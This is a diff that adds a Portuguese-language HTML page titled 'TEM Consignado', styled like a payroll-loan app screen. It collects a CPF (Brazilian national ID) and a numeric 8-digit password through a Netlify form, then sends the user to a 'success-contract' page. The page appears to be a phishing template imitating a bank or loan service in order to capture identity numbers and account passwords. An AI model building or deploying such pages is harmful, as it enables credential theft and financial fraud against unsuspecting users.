@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>TEM Consignado</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container">
+    <h2>
+      <img src="img/icon.png" alt="vamo ver ne" style="vertical-align: middle;">
+    </h2>
+    <form method="post" name="contact" netlify>
+      <input type="text" id="CPF" name="CPF" placeholder="DIGITE SEU CPF" maxlength="14" required="" pattern="\d*" title="Digite apenas números">
+      <span class="error-message" id="cpfError"></span>
+      
+      <input type="password" class="password-input" id="SENHA" name="SENHA" placeholder="DIGITE SUA SENHA" maxlength="8" required="" pattern="\d*" title="Digite apenas números">
+      <span class="error-message" id="senhaError"></span>
+
+      <a href="success-contract.html"><button type="button">CONTRATAR</button></a>
+    </form>
+    <div class="help-text">
+      <label><input type="checkbox" class="no-show-again" style="height: 15px; width: 15px;"> Não mostrar novamente</label>
+    </div>
+    <div class="help-text">Preciso de ajuda</div>
+    <div class="version">v1.78.1</div>
+
+  </div>
+</body>
+</html>
